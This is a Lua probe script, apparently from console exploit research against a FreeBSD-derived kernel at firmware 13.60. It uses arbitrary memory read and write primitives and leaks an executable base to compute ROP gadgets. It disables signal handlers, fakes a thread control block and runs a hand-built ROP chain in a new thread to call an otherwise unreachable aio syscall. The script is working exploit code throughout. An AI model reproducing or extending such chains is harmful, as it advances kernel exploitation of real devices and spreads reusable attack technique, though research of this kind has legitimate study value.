-- CRASH_CLASS: MODERATE
-- PROBE 550a: aio_multi_wait (663) from a raw child
--
-- Context: 663 is the only aio path never exercised. Its 13.60 body reads
-- uap[0]=ids, uap[8]=count, uap[0x10]=out, uap[0x18]=timeout, uap[0x20]=extra,
-- so it needs a fourth syscall argument, which only the chain can supply.
--
-- Case A calls it on a live completed id with a 200 ms timeout. The child
-- exits afterwards, so nothing stays parked.

print("=== PROBE 550a: AIO WAIT FROM A CHAIN ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_pop_rcx  = eb + 0xE64
local g_bare_ret = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local sc_create = mk(669)
local sc_poll   = mk(664)
local sc_thr_new = mk(455)
local data = memory.alloc(0x100)
local out_id = memory.alloc(0x40)
local cell = memory.alloc(16)
local poll_out = memory.alloc(0x40)

for i = 0, 0xFC, 4 do wd(N(data) + i, 0) end
wq(N(out_id), uint64(0))
local rv = N(sc_create(uint64(1), uint64(N(data)), uint64(1), uint64(1), uint64(N(out_id))))
local id = rd(N(out_id)) or 0
wd(N(cell), id)
wd(N(poll_out), 0xCCCCCCCC)
pcall(function() sc_poll(uint64(N(cell)), uint64(1), uint64(N(poll_out))) end)
print(string.format("[A] create ret=%d id=%08X poll=%08X", rv, id, rd(N(poll_out)) or 0))

local ts = memory.alloc(0x10)
wd(N(ts), 0); wd(N(ts) + 4, 0); wd(N(ts) + 8, 200000000); wd(N(ts) + 12, 0)
local wout = memory.alloc(0x100)
for i = 0, 0xFC, 4 do wd(N(wout) + i, 0xCCCCCCCC) end

local CHAIN_MAX = 0x8000
local stk = memory.alloc(0x8000 + CHAIN_MAX)
local sb = N(stk)
local ss = 0x8000
local rsp = sb + ss - 8
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

emit_sysarch_preamble(emit)
emit(g_pop_rdi); emit(uint64(N(cell)))
emit(g_pop_rsi); emit(uint64(1))
emit(g_pop_rdx); emit(uint64(N(wout)))
emit(g_pop_rcx); emit(uint64(N(ts)))
emit(g_pop_rax); emit(uint64(663))
emit(stub)
emit(g_pop_rdi); emit(uint64(0))
emit(g_pop_rax); emit(uint64(431))
emit(stub)

local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x08, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_ptr = memory.alloc(8)
wq(N(tid_ptr), uint64(0))
wq(pa + 0x30, tid_ptr)

print(string.format("[B] chain bytes=%d out[0]=%08X", off, rd(N(wout)) or 0))
local ok, trv = pcall(function() return sc_thr_new(par, uint64(0x38)) end)
print(string.format("[C] thr_new ok=%s rv=%s", tostring(ok), tostring(N(trv))))
for i = 1, 900000 do end
print(string.format("[D] out[0]=%08X out[4]=%08X alive=%s",
    rd(N(wout)) or 0, rd(N(wout) + 4) or 0, tostring(alive())))
print("=== DONE ===")
